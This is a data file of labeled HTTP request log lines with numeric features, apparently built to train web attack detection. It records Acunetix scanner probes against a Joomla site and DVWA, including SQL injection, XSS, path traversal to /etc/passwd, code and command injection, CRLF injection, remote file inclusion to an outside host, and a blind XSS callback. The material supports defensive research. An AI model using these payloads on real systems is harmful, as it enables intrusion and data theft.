38,1,500,1522,8,21,2,3,1,POST /administrator/index.php HTTP/1.1
42,1,303,363,8,23,2,5,0,POST /index.php/component/search/ HTTP/1.1
104,4,200,3122,7,75,12,5,0,GET /index.php/component/search/?searchword=&ordering=alpha&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
48,1,200,4918,7,27,2,5,0,GET /templates/beez_20/css/personal.css HTTP/1.1
100,1,200,3304,11,30,21,4,1,GET /index.php/2-uncategorised/1--1'%20OR%202%2b196-196-1=0%2b0%2b0%2b1%20or%20'01Fg5alL'=' HTTP/1.1
57,1,303,385,8,35,5,5,0,POST /index.php/component/users/?task=user.login HTTP/1.1
58,1,200,2767,8,35,4,7,1,POST /index.php/component/users/?task=/etc/passwd HTTP/1.1
49,1,404,526,8,25,3,5,1,GET /$sitepreview/localhost:2006/Wizard/ HTTP/1.1
46,1,200,68451,7,27,3,5,0,GET /media/system/js/mootools-more.js HTTP/1.1
104,3,200,3123,7,64,10,5,0,GET /index.php/component/search/?ordering=newest%26n944645=v964541&searchphrase=all&searchword= HTTP/1.1
45,1,200,2149,7,24,2,5,0,GET /templates/beez_20/css/print.css HTTP/1.1
98,3,200,3148,7,64,12,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=%f0''%f0\"\" HTTP/1.1
24,1,200,1847,8,8,2,2,0,POST /index.php HTTP/1.1
68,1,200,237,8,46,5,5,0,POST /index.php/component/users/?task=registration.register HTTP/1.1
29,1,302,469,12,8,2,3,0,POST /DVWA/login.php HTTP/1.1
40,1,200,751,7,22,2,5,0,GET /media/system/js/caption.js HTTP/1.1
156,4,200,3289,23,86,22,5,0,GET /index.php/component/search/?searchword=acu4052%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca4052&ordering=oldest&searchphrase=all&areas[0]=categories HTTP/1.1
53,1,404,3996,7,14,4,5,1,GET /index.php/%24{9999410%2b9999115}/users/ HTTP/1.1
14,1,200,3358,7,0,1,2,0,GET / HTTP/1.1
130,4,200,3162,13,91,12,5,1,GET /index.php/component/search/?searchword=&ordering=popular&searchphrase=any&areas[0]=categoriesacxScRiPtkzsy9922ScRiPt HTTP/1.1
122,3,200,3259,8,89,12,9,0,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=Http://testasp.vulnweb.com/t/fit.txt HTTP/1.1
120,3,200,1525,7,66,23,4,1,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=-1;%20waitfor%20delay%20'0:0:6'%20--%20&tmpl=component HTTP/1.1
142,3,200,3104,7,71,24,5,1,GET /index.php/component/search/?ordering=popular&searchphrase=12345'\"\\'\\\");|]*%00{%0d%0a<%00>%bf%27'\xf0\x9f\x92\xa9&searchword= HTTP/1.1
61,1,404,538,10,34,4,8,1,GET /http://hitvtXI9axeIm.bxss.me//component/search/ HTTP/1.1
89,1,301,736,20,30,17,5,1,GET /DVWA/vulnerabilities/fi?page='\"()%26%25<acx><ScRiPt%20>H5NJ(9347)</ScRiPt> HTTP/1.1
103,3,200,3166,7,76,10,6,0,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=/www.vulnweb.com HTTP/1.1
104,3,500,2089,8,66,14,5,1,GET /index.php/component/content/?format=feed&type=atom&view=featured<body%20onload=p3oZ(9741)> HTTP/1.1
158,4,200,3323,13,101,24,7,1,GET /index.php/component/search/?searchword=ul.menu\"sTYLe='acu:Expre/**/SSion(kzsy(9157))'bad=\"&ordering=popular&searchphrase=any&areas[0]=weblinks HTTP/1.1
37,1,200,4030,7,20,2,3,0,GET /images/joomla_black.gif HTTP/1.1
51,1,200,2736,8,26,5,5,1,POST /index.php/component/users/?task=1'\" HTTP/1.1
53,1,200,447,7,31,2,5,0,GET /templates/beez_20/images/content_bg.gif HTTP/1.1
86,3,500,2065,13,52,10,7,1,GET /index.php/component/content/?format=feed&type=atom&view=/WEB-INF/web.xml HTTP/1.1
159,4,200,3324,13,102,24,7,1,GET /index.php/component/search/?searchword=ul.menu\"sTYLe='acu:Expre/**/SSion(kzsy(9807))'bad=\"&ordering=newest&searchphrase=all&areas[0]=categories HTTP/1.1
114,3,200,338,9,64,9,5,0,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=JyI= HTTP/1.1
60,1,200,237,8,38,5,5,0,POST /index.php/component/users/?task=reset.request HTTP/1.1
55,1,302,390,11,30,3,7,1,GET /DVWA/vulnerabilities/fi/?page=/etc/passwd HTTP/1.1
129,1,200,237,9,92,10,8,0,POST /index.php/component/users/?task=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.register HTTP/1.1
126,3,200,3256,11,75,20,5,1,GET /index.php/component/search/?searchword=ul.menu\"%201ZXt=kzsy([!%20!])%20ZXp=\"&ordering=popular&searchphrase=any HTTP/1.1
123,3,200,3103,7,89,10,5,0,GET /index.php/component/search/?ordering=1some_inexistent_file_with_long_name%00.jpg&searchphrase=any&searchword= HTTP/1.1
61,1,200,5113,7,38,2,6,0,GET /templates/beez_20/images/personal/tabs_back.png HTTP/1.1
179,3,200,3234,18,74,41,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg HTTP/1.1
98,1,200,3536,14,47,14,6,1,GET /index.php/component/content/category/2-uncategorised\"%20A7GI=KmPG([!%2b!])%20V75=\" HTTP/1.1
28,1,200,986,11,8,2,3,0,GET /DVWA/login.php HTTP/1.1
123,3,500,1983,7,81,16,5,1,GET /index.php/component/content/?format=feed&type=\";print(md5(acunetix_wvs_security_test));%24a=\"&view=featured HTTP/1.1
98,1,301,733,15,58,9,4,0,GET /DVWA/vulnerabilities/fi?page=%c4%8d%c4%8aSomeCustomInjectedHeader:%20injected_by_wvs HTTP/1.1
84,3,500,2045,7,49,12,5,1,GET /index.php/component/content/?format=617-0-0-0-0&type=rss&view=featured HTTP/1.1
111,1,404,3990,7,63,12,7,1,GET /index.php/component/'%2bresponse.write(9643611*9133510)%2b'/article/2-uncategorised/1-testsayfasi HTTP/1.1
113,1,200,3263,7,73,14,7,1,GET /index.php/component/content/article/2-';print(md5(acunetix_wvs_security_test));%24a='/1-testsayfasi HTTP/1.1
87,3,200,3159,7,62,9,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=) HTTP/1.1
45,2,500,1983,7,22,10,2,1,GET /index.php?format=feed&type=<!-- HTTP/1.1
99,1,404,3990,7,68,9,6,1,GET /index.php/component/;print(md5(acunetix_wvs_security_test));/category/2-uncategorised HTTP/1.1
136,4,200,3204,13,96,13,5,1,GET /index.php/component/search/?searchword=ul.menu&ordering=newest&searchphrase=all&areas[0]=categoriesacxScRiPtkzsy9164ScRiPt HTTP/1.1
99,3,200,3110,13,69,8,5,1,GET /index.php/component/search/?searchword=&ordering=acxScRiPtkzsyScRiPt&searchphrase=all HTTP/1.1
91,3,500,2051,7,48,20,5,1,GET /index.php/component/content/?format=feed&type=rss&view=!(()%26%26!%7c*%7c*%7c HTTP/1.1
76,1,404,3995,9,17,16,5,1,GET /index.php/-1%20OR%202%2b394-394-1=0%2b0%2b0%2b1%20--%20/users/ HTTP/1.1
97,1,500,2113,16,44,6,6,1,GET /index.php/component/users/?view=login\\u003CScRiPt\\Uqla(9856)\\u003C/sCripT\\u003E HTTP/1.1
95,3,200,3107,7,66,10,5,0,GET /index.php/component/search/?ordering=set%7cset%26set&searchphrase=all&searchword= HTTP/1.1
89,3,500,2075,7,63,10,5,1,GET /index.php/component/content/?format=feed&type=atom&view=testasp.vulnweb.com HTTP/1.1
56,1,200,3280,7,32,5,4,1,GET /index.php/288'-uncategorised/1-testsayfasi HTTP/1.1
117,1,404,582,9,51,17,7,1,GET /-1\"%20OR%203%2b319-319-1=0%2b0%2b0%2b1%20--%20/component/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
120,3,200,3116,7,65,28,16,1,GET /index.php/component/search/?ordering=../../../../../../../../../../etc/passwd&searchphrase=all&searchword= HTTP/1.1
59,1,404,536,7,34,5,4,1,GET /set%7cset%26set/2-uncategorised/1-testsayfasi HTTP/1.1
28,1,404,505,7,9,3,2,1,GET /192-backup.rar HTTP/1.1
72,1,404,3990,7,29,10,2,1,GET /index.php?option=\"%2bresponse.write(9696274*9944323)%2b\" HTTP/1.1
139,4,200,3270,7,98,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9698)\"&ordering=newest&searchphrase=all&areas[0]=categories HTTP/1.1
61,1,500,2051,7,36,6,5,1,GET /index.php/component/users/?view=set%7cset%26set HTTP/1.1
